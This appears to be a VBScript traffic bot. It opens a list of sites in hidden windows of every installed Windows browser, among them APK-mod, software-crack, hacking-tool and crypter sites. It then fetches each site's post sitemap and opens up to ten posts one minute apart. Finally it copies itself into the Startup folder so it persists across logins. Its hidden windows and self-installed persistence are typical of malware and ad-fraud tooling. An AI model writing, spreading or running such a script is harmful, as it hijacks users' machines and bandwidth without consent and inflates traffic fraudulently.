Option Explicit
Dim sites, browsers, browser_paths, base_url, browser, browser_path, xmlhttp, sitemap_url
Dim dom, loc_nodes, num_posts, post_urls, i, j, WShell, shell, startup_folder, fso
Dim script_fullname, script_name

' Array of websites
sites = Array( _
    "https://www.apksure.asia", _
    "https://www.apksure.cc", _
    "https://www.apksure.info", _
    "https://www.forearmtattoos.net", _
    "https://www.apksure.net", _
    "https://www.jackintheboxmenu.us", _
    "https://www.blackhatusa.com", _
    "https://www.scootersmenu.us", _
    "https://www.texasroadhousemenus.us", _
    "https://www.wendymenus.us", _
    "https://www.sonicmenuwithprices.us", _
    "https://www.wafflehousemenus.us", _
    "https://www.thehackingtools.net", _
    "https://www.firehousesubsmenuprice.com", _
    "https://www.tiktokmodapk.com", _
    "https://www.thehackingtools.com", _
    "https://www.adobephotoshopcrack.com", _
    "https://www.rinsins.com", _
    "https://www.cryptersrc.com", _
    "https://www.blankhack.com", _
    "https://www.psddl.com", _
    "https://www.blackhatrussia.com", _
    "https://www.shanghaiblackgoons.com", _
    "https://www.blackhatrussia.org" _
)

' Array of browsers and their executable paths (default installation paths for Windows)
browsers = Array("firefox", "chrome", "opera", "operagx", "brave", "msedge", "tor")
browser_paths = Array( _
    """C:\Program Files\Mozilla Firefox\firefox.exe""", _
    """C:\Program Files\Google\Chrome\Application\chrome.exe""", _
    """C:\Users\" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Local\Programs\Opera\launcher.exe""", _
    """C:\Users\" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Local\Programs\Opera GX\launcher.exe""", _
    """C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe""", _
    """C:\Program Files\Microsoft\Edge\Application\msedge.exe""", _
    """C:\Users\" & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Local\Tor Browser\Browser\firefox.exe""" _
)

' Create shell object for running commands
Set WShell = CreateObject("WScript.Shell")

' Open each website in all browsers simultaneously
For Each base_url In sites
    For i = 0 To UBound(browsers)
        browser_path = browser_paths(i)
        WShell.Run browser_path & " " & base_url, 0, False
        WScript.Sleep 1000 ' Brief pause to avoid overwhelming the system
    Next
Next

' Process each website's sitemap
For Each base_url In sites
    Set xmlhttp = CreateObject("MSXML2.XMLHTTP")
    sitemap_url = base_url & "/post-sitemap1.xml"
    xmlhttp.Open "GET", sitemap_url, False
    On Error Resume Next
    xmlhttp.Send
    On Error GoTo 0

    If xmlhttp.Status = 200 Then
        Set dom = CreateObject("MSXML2.DOMDocument.6.0")
        dom.async = False
        dom.loadXML xmlhttp.responseText

        If dom.parseError.errorCode = 0 Then
            Set loc_nodes = dom.selectNodes("//url/loc")
            num_posts = loc_nodes.length

            If num_posts > 0 Then
                ReDim post_urls(9) ' Array for up to 10 posts
                For i = 0 To 9
                    If i < num_posts Then
                        post_urls(i) = loc_nodes(i).text
                    Else
                        post_urls(i) = ""
                    End If
                Next

                ' Open posts in reverse order in all browsers
                For j = 9 To 0 Step -1
                    If post_urls(j) <> "" Then
                        For i = 0 To UBound(browsers)
                            browser_path = browser_paths(i)
                            WShell.Run browser_path & " " & post_urls(j), 0, False
                        Next
                        WScript.Sleep 60000 ' Wait 1 minute before opening the next post
                    End If
                Next
            End If
        End If
    End If
    Set xmlhttp = Nothing
    Set dom = Nothing
    Set loc_nodes = Nothing
Next

' Add script to startup if not already present
Set shell = CreateObject("WScript.Shell")
startup_folder = shell.SpecialFolders("Startup")
Set fso = CreateObject("Scripting.FileSystemObject")
script_fullname = WScript.ScriptFullName
script_name = WScript.ScriptName

If Not fso.FileExists(startup_folder & "\" & script_name) Then
    fso.CopyFile script_fullname, startup_folder & "\" & script_name
End If

' Clean up
Set WShell = Nothing
Set shell = Nothing
Set fso = Nothing